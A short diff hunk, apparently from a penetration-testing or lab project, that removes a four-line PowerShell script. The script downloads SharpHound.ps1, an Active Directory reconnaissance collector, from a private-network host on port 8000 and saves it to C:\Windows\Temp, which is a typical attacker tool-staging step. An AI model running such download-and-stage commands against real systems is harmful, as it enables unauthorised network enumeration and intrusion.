@@ -1,4 +1,0 @@
-$url = "http://10.10.16.187:8000/SharpHound.ps1"
-$output = "C:\Windows\Temp\SharpHound.ps1"
-(New-Object System.Net.WebClient).DownloadFile($url, $output)
-
